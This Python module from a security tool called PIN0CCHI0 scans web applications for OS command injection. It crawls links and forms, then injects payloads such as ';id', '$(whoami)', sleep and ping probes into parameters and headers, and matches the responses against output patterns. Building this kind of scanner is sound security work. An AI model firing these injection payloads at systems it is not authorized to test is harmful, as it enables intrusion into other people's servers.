#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Command Injection Testing Module for PIN0CCHI0

This module performs specialized command injection testing using various techniques
to identify and exploit command injection vulnerabilities in web applications.
"""

import os
import json
import re
import time
import logging
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

from core.base_module import VulnTestingModule
from core.utils import make_request, run_command, ensure_dir_exists

# Configure logger
logger = logging.getLogger('pin0cchi0.vuln_testing.command_injection')

class CommandInjection(VulnTestingModule):
    """Command Injection testing module for PIN0CCHI0."""
    
    def __init__(self):
        """Initialize the Command Injection testing module."""
        super().__init__()
        self.name = "Command Injection Scanner"
        self.description = "Tests for command injection vulnerabilities in web applications"
        self.category = "vuln_testing"
        self.author = "PIN0CCHI0 Team"
        self.version = "0.1.0"
        self.references = [
            "https://owasp.org/www-community/attacks/Command_Injection",
            "https://portswigger.net/web-security/os-command-injection",
            "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"
        ]
        
        # Initialize results storage
        self.vulnerabilities = []
        self.tested_endpoints = set()
        
        # Command injection payloads
        self.basic_payloads = [
            ';id',
            '|id',
            '`id`',
            '$(id)',
            ';ls -la',
            '|ls -la',
            '`ls -la`',
            '$(ls -la)',
            '& whoami',
            '&& whoami',
            '|| whoami',
            '; whoami',
            '| whoami',
            '`whoami`',
            '$(whoami)'
        ]
        
        # Windows-specific payloads
        self.windows_payloads = [
            '& dir',
            '&& dir',
            '|| dir',
            '; dir',
            '| dir',
            '`dir`',
            '$(dir)',
            '& type %WINDIR%\win.ini',
            '&& type %WINDIR%\win.ini',
            '|| type %WINDIR%\win.ini',
            '; type %WINDIR%\win.ini',
            '| type %WINDIR%\win.ini'
        ]
        
        # Blind command injection payloads (time-based)
        self.blind_payloads = [
            '; ping -c 5 127.0.0.1',
            '| ping -c 5 127.0.0.1',
            '`ping -c 5 127.0.0.1`',
            '$(ping -c 5 127.0.0.1)',
            '& ping -n 5 127.0.0.1',
            '&& ping -n 5 127.0.0.1',
            '|| ping -n 5 127.0.0.1',
            '; sleep 5',
            '| sleep 5',
            '`sleep 5`',
            '$(sleep 5)',
            '& timeout 5',
            '&& timeout 5',
            '|| timeout 5'
        ]
        
        # Command injection detection patterns
        self.detection_patterns = [
            # Unix patterns
            re.compile(r'uid=\d+\(\w+\)\s+gid=\d+\(\w+\)'),  # id command output
            re.compile(r'total\s+\d+'),  # ls -la output
            re.compile(r'drwx'),  # ls -la directory permissions
            re.compile(r'-rwx'),  # ls -la file permissions
            re.compile(r'root:.*:0:0'),  # /etc/passwd content
            
            # Windows patterns
            re.compile(r'Volume in drive [A-Z] is'),  # dir output
            re.compile(r'Directory of'),  # dir output
            re.compile(r'\d+ File\(s\)'),  # dir output
            re.compile(r'\d+ Dir\(s\)'),  # dir output
            re.compile(r'\[fonts\]'),  # win.ini content
            re.compile(r'\[extensions\]'),  # win.ini content
            
            # Common username patterns
            re.compile(r'^\w+$'),  # whoami output (simple username)
            re.compile(r'^\w+\\\w+$')  # Windows domain\username format
        ]
        
    def run(self, target, config=None):
        """Run the command injection scanner on the target.
        
        Args:
            target (str): The target URL to test
            config (dict): Configuration options for the test
            
        Returns:
            dict: Test results and identified vulnerabilities
        """
        logger.info(f"Starting command injection scanning on {target}")
        
        if config is None:
            config = {}
        
        # Ensure target is properly formatted
        if not target.startswith(('http://', 'https://')):
            target = f"http://{target}"
        
        # Create results directory
        timestamp = int(time.time())
        results_dir = os.path.join(os.getcwd(), 'results', 'vuln_testing', f"cmd_injection_scan_{timestamp}")
        ensure_dir_exists(results_dir)
        
        # Get configuration options
        max_threads = config.get('command_injection', {}).get('max_threads', 5)
        test_headers = config.get('command_injection', {}).get('test_headers', False)
        test_blind = config.get('command_injection', {}).get('test_blind', True)
        os_type = config.get('command_injection', {}).get('os_type', 'auto')  # 'auto', 'unix', 'windows'
        
        # Discover endpoints to test
        endpoints = self._discover_endpoints(target)
        
        # Determine target OS if set to auto
        if os_type == 'auto':
            os_type = self._detect_os_type(target)
            logger.info(f"Detected OS type: {os_type}")
        
        # Select payloads based on OS type
        payloads = self.basic_payloads
        if os_type == 'windows':
            payloads.extend(self.windows_payloads)
        
        # Test discovered endpoints for command injection
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            # Test URL parameters
            for endpoint in endpoints:
                if endpoint['url'] not in self.tested_endpoints:
                    self.tested_endpoints.add(endpoint['url'])
                    executor.submit(self._test_endpoint, endpoint, payloads, test_blind)
        
        # Test HTTP headers if enabled
        if test_headers:
            self._test_headers(target, payloads)
        
        # Consolidate and deduplicate results
        self._consolidate_results()
        
        # Save results to file
        results_file = os.path.join(results_dir, 'command_injection_results.json')
        with open(results_file, 'w') as f:
            json.dump({
                'target': target,
                'timestamp': timestamp,
                'vulnerabilities': self.vulnerabilities,
                'scan_summary': {
                    'total_vulnerabilities': len(self.vulnerabilities),
                    'total_endpoints_tested': len(self.tested_endpoints)
                }
            }, f, indent=2)
        
        logger.info(f"Command injection scanning completed. Found {len(self.vulnerabilities)} potential vulnerabilities.")
        logger.info(f"Results saved to {results_file}")
        
        return {
            'vulnerabilities': self.vulnerabilities,
            'results_file': results_file
        }
    
    def _discover_endpoints(self, target):
        """Discover endpoints on the target for testing."""
        logger.info(f"Discovering endpoints on {target}")
        
        endpoints = []
        
        # Add the main target URL
        endpoints.append({'url': target, 'type': 'url'})
        
        # Get the main page
        response = make_request(target)
        
        if not response['success']:
            logger.warning(f"Failed to retrieve main page for endpoint discovery: {response.get('error', 'Unknown error')}")
            return endpoints
        
        html = response['text']
        
        # Find all links with query parameters
        link_pattern = re.compile(r'href=["\']([^"\'>]*\?[^"\'>]*)["\']', re.IGNORECASE)
        links = link_pattern.findall(html)
        
        for link in links:
            # Handle relative URLs
            if not link.startswith(('http://', 'https://', '//')): 
                link = urllib.parse.urljoin(target, link)
            elif link.startswith('//'):
                link = 'https:' + link if target.startswith('https') else 'http:' + link
            
            # Only include endpoints from the same domain
            if urllib.parse.urlparse(link).netloc == urllib.parse.urlparse(target).netloc:
                endpoints.append({'url': link, 'type': 'link'})
        
        # Find all forms
        form_pattern = re.compile(r'<form[^>]*action=["\']([^"\'>]*)["\'][^>]*>(.*?)</form>', re.DOTALL | re.IGNORECASE)
        form_matches = form_pattern.findall(html)
        
        for action, form_content in form_matches:
            # Handle empty action (submits to current page)
            if not action:
                action = urllib.parse.urlparse(target).path or '/'
            
            # Handle relative URLs
            if not action.startswith(('http://', 'https://', '//')): 
                action = urllib.parse.urljoin(target, action)
            elif action.startswith('//'):
                action = 'https:' + action if target.startswith('https') else 'http:' + action
            
            # Only include endpoints from the same domain
            if urllib.parse.urlparse(action).netloc == urllib.parse.urlparse(target).netloc:
                # Find input fields
                input_pattern = re.compile(r'<input[^>]*name=["\']([^"\'>]+)["\'][^>]*>', re.IGNORECASE)
                inputs = input_pattern.findall(form_content)
                
                # Add form endpoint with input fields
                endpoints.append({
                    'url': action,
                    'type': 'form',
                    'method': self._get_form_method(form_content),
                    'inputs': inputs
                })
        
        # Look for potential command execution endpoints
        potential_cmd_endpoints = []
        for endpoint in endpoints:
            url = endpoint['url']
            parsed_url = urllib.parse.urlparse(url)
            path = parsed_url.path.lower()
            query = parsed_url.query.lower()
            
            # Check for paths or parameters that might involve command execution
            cmd_keywords = ['exec', 'cmd', 'command', 'run', 'shell', 'system', 'ping', 'tracert', 'traceroute', 'nslookup', 'dig']
            
            if any(keyword in path for keyword in cmd_keywords):
                potential_cmd_endpoints.append(endpoint)
                continue
            
            if any(keyword in query for keyword in cmd_keywords):
                potential_cmd_endpoints.append(endpoint)
                continue
            
            # Check form inputs for command-related names
            if endpoint['type'] == 'form' and 'inputs' in endpoint:
                if any(any(keyword in input_name.lower() for keyword in cmd_keywords) for input_name in endpoint['inputs']):
                    potential_cmd_endpoints.append(endpoint)
        
        # Prioritize potential command execution endpoints
        for endpoint in potential_cmd_endpoints:
            if endpoint in endpoints:
                endpoints.remove(endpoint)
            endpoints.insert(0, endpoint)  # Add to the beginning of the list
        
        # Deduplicate endpoints
        unique_endpoints = []
        seen_urls = set()
        
        for endpoint in endpoints:
            url = endpoint['url']
            # Remove fragments
            url = url.split('#')[0]
            
            # Create a unique key based on URL and type
            key = f"{url}|{endpoint['type']}"
            
            if key not in seen_urls:
                seen_urls.add(key)
                endpoint['url'] = url
                unique_endpoints.append(endpoint)
        
        logger.info(f"Discovered {len(unique_endpoints)} unique endpoints")
        return unique_endpoints
    
    def _get_form_method(self, form_content):
        """Extract the HTTP method from a form."""
        method_match = re.search(r'method=["\']([^"\'>]+)["\']', form_content, re.IGNORECASE)
        if method_match:
            return method_match.group(1).upper()
        return 'GET'  # Default to GET if method not specified
    
    def _detect_os_type(self, target):
        """Attempt to detect the target OS type."""
        # Try to detect OS based on response headers
        response = make_request(target)
        
        if not response['success']:
            return 'unix'  # Default to Unix if detection fails
        
        headers = response.get('headers', {})
        server = headers.get('Server', '')
        
        # Check for Windows-specific server headers
        if any(win_server in server for win_server in ['Microsoft', 'IIS', 'Windows']):
            return 'windows'
        
        # Check for Unix-specific server headers
        if any(unix_server in server for unix_server in ['Apache', 'nginx', 'Unix', 'Debian', 'Ubuntu', 'CentOS']):
            return 'unix'
        
        # Default to Unix if detection fails
        return 'unix'
    
    def _test_endpoint(self, endpoint, payloads, test_blind=True):
        """Test an endpoint for command injection vulnerabilities."""
        url = endpoint['url']
        logger.info(f"Testing endpoint for command injection: {url}")
        
        # Parse URL to get parameters
        parsed_url = urllib.parse.urlparse(url)
        path = parsed_url.path
        query = parsed_url.query
        
        # If URL has query parameters, test each parameter
        if query:
            params = query.split('&')
            for param in params:
                if '=' in param:
                    param_name = param.split('=')[0]
                    
                    # Test standard command injection
                    if self._test_parameter(url, param_name, parsed_url, payloads):
                        continue  # Found a vulnerability, no need to test blind injection
                    
                    # Test blind command injection if enabled
                    if test_blind:
                        self._test_blind_injection(url, param_name, parsed_url)
        
        # If endpoint is a form, test form inputs
        if endpoint['type'] == 'form' and 'inputs' in endpoint:
            for input_name in endpoint['inputs']:
                # For GET forms, parameters are in the URL
                if endpoint['method'] == 'GET':
                    # Test standard command injection
                    if self._test_parameter(url, input_name, parsed_url, payloads):
                        continue  # Found a vulnerability, no need to test blind injection
                    
                    # Test blind command injection if enabled
                    if test_blind:
                        self._test_blind_injection(url, input_name, parsed_url)
                
                # For POST forms, we need to send POST requests
                else:  # POST, PUT, etc.
                    # Test standard command injection with POST
                    if self._test_parameter_post(url, input_name, payloads):
                        continue  # Found a vulnerability, no need to test blind injection
                    
                    # Test blind command injection if enabled
                    if test_blind:
                        self._test_blind_injection_post(url, input_name)
    
    def _test_parameter(self, url, param_name, parsed_url, payloads):
        """Test for command injection in a URL parameter."""
        path = parsed_url.path
        query = parsed_url.query
        
        # Test each payload
        for payload in payloads:
            # Replace parameter value with payload
            new_query = self._replace_param_value(query, param_name, payload)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{path}?{new_query}"
            
            # Send request with payload
            response = make_request(test_url)
            
            if not response['success']:
                continue
            
            # Check if command output is in the response
            if self._is_command_output_present(response['text']):
                vuln = {
                    'name': "Command Injection",
                    'severity': "critical",
                    'description': "A command injection vulnerability was found, which could allow attackers to execute arbitrary commands on the server.",
                    'location': url,
                    'parameter': param_name,
                    'payload': payload,
                    'evidence': f"Command output detected in the response",
                    'type': 'command_injection',
                    'remediation': "Avoid using shell commands with user input. If necessary, implement strict input validation and use safer alternatives like APIs."
                }
                self.vulnerabilities.append(vuln)
                logger.info(f"Found command injection vulnerability in parameter {param_name} on {url}")
                return True  # Found a vulnerability
        
        return False  # No vulnerability found
    
    def _test_parameter_post(self, url, param_name, payloads):
        """Test for command injection in a POST parameter."""
        # Test each payload
        for payload in payloads:
            # Send request with payload
            response = make_request(url, method='POST', data={param_name: payload})
            
            if not response['success']:
                continue
            
            # Check if command output is in the response
            if self._is_command_output_present(response['text']):
                vuln = {
                    'name': "Command Injection in POST parameter",
                    'severity': "critical",
                    'description': "A command injection vulnerability was found in a POST parameter, which could allow attackers to execute arbitrary commands on the server.",
                    'location': url,
                    'parameter': param_name,
                    'payload': payload,
                    'evidence': f"Command output detected in the response",
                    'type': 'command_injection_post',
                    'remediation': "Avoid using shell commands with user input. If necessary, implement strict input validation and use safer alternatives like APIs."
                }
                self.vulnerabilities.append(vuln)
                logger.info(f"Found command injection vulnerability in POST parameter {param_name} on {url}")
                return True  # Found a vulnerability
        
        return False  # No vulnerability found
    
    def _test_blind_injection(self, url, param_name, parsed_url):
        """Test for blind command injection in a URL parameter."""
        path = parsed_url.path
        query = parsed_url.query
        
        # Test each blind payload
        for payload in self.blind_payloads:
            # Replace parameter value with payload
            new_query = self._replace_param_value(query, param_name, payload)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{path}?{new_query}"
            
            # Measure response time
            start_time = time.time()
            response = make_request(test_url)
            end_time = time.time()
            response_time = end_time - start_time
            
            if not response['success']:
                continue
            
            # Check for time delay (indicating blind command injection)
            # Adjust threshold based on payload (ping/sleep commands should take 5+ seconds)
            threshold = 4.5  # slightly less than 5 to account for network variations
            if response_time > threshold:
                vuln = {
                    'name': "Blind Command Injection",
                    'severity': "critical",
                    'description': "A blind command injection vulnerability was found, which could allow attackers to execute arbitrary commands on the server without visible output.",
                    'location': url,
                    'parameter': param_name,
                    'payload': payload,
                    'evidence': f"Time-based detection: response took {response_time:.2f} seconds",
                    'type': 'blind_command_injection',
                    'remediation': "Avoid using shell commands with user input. If necessary, implement strict input validation and use safer alternatives like APIs."
                }
                self.vulnerabilities.append(vuln)
                logger.info(f"Found blind command injection vulnerability in parameter {param_name} on {url}")
                return True  # Found a vulnerability
        
        return False  # No vulnerability found
    
    def _test_blind_injection_post(self, url, param_name):
        """Test for blind command injection in a POST parameter."""
        # Test each blind payload
        for payload in self.blind_payloads:
            # Measure response time
            start_time = time.time()
            response = make_request(url, method='POST', data={param_name: payload})
            end_time = time.time()
            response_time = end_time - start_time
            
            if not response['success']:
                continue
            
            # Check for time delay (indicating blind command injection)
            threshold = 4.5  # slightly less than 5 to account for network variations
            if response_time > threshold:
                vuln = {
                    'name': "Blind Command Injection in POST parameter",
                    'severity': "critical",
                    'description': "A blind command injection vulnerability was found in a POST parameter, which could allow attackers to execute arbitrary commands on the server without visible output.",
                    'location': url,
                    'parameter': param_name,
                    'payload': payload,
                    'evidence': f"Time-based detection: response took {response_time:.2f} seconds",
                    'type': 'blind_command_injection_post',
                    'remediation': "Avoid using shell commands with user input. If necessary, implement strict input validation and use safer alternatives like APIs."
                }
                self.vulnerabilities.append(vuln)
                logger.info(f"Found blind command injection vulnerability in POST parameter {param_name} on {url}")
                return True  # Found a vulnerability
        
        return False  # No vulnerability found
    
    def _test_headers(self, target, payloads):
        """Test HTTP headers for command injection vulnerabilities."""
        logger.info(f"Testing HTTP headers for command injection on {target}")
        
        # Headers to test
        headers_to_test = ['User-Agent', 'Referer', 'X-Forwarded-For']
        
        # Test each header with a subset of payloads
        for header in headers_to_test:
            for payload in payloads[:5]:  # Use a subset of payloads for headers
                custom_headers = {header: payload}
                response = make_request(target, headers=custom_headers)
                
                if not response['success']:
                    continue
                
                # Check if command output is in the response
                if self._is_command_output_present(response['text']):
                    vuln = {
                        'name': f"Command Injection in {header} header",
                        'severity': "critical",
                        'description': f"A command injection vulnerability was found in the {header} HTTP header.",
                        'location': target,
                        'parameter': header,
                        'payload': payload,
                        'evidence': f"Command output detected in the response",
                        'type': 'header_command_injection',
                        'remediation': "Implement proper validation of HTTP headers and avoid using them in shell commands."
                    }
                    self.vulnerabilities.append(vuln)
                    logger.info(f"Found command injection vulnerability in {header} header on {target}")
                    break  # Found a vulnerability, no need to test more payloads
    
    def _is_command_output_present(self, response_text):
        """Check if command output is present in the response."""
        # Check for command output patterns
        for pattern in self.detection_patterns:
            if pattern.search(response_text):
                return True
        
        return False
    
    def _replace_param_value(self, query, param_name, new_value):
        """Replace a parameter value in a query string."""
        params = query.split('&')
        new_params = []
        
        for param in params:
            if '=' in param:
                name, value = param.split('=', 1)
                if name == param_name:
                    new_params.append(f"{name}={urllib.parse.quote_plus(new_value)}")
                else:
                    new_params.append(param)
            else:
                new_params.append(param)
        
        return '&'.join(new_params)
    
    def _consolidate_results(self):
        """Consolidate and deduplicate vulnerability findings."""
        logger.info("Consolidating command injection findings")
        
        # Deduplicate vulnerabilities
        unique_vulns = []
        seen_vulns = set()
        
        for vuln in self.vulnerabilities:
            # Create a key for deduplication
            key = f"{vuln['name']}|{vuln['location']}|{vuln.get('parameter', '')}"
            
            if key not in seen_vulns:
                seen_vulns.add(key)
                unique_vulns.append(vuln)
        
        # Update vulnerabilities list
        self.vulnerabilities = unique_vulns
        
        # Sort by severity
        severity_order = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3, 'info': 4}
        self.vulnerabilities.sort(key=lambda x: severity_order.get(x['severity'], 5))
        
        logger.info(f"Consolidated to {len(self.vulnerabilities)} unique vulnerabilities")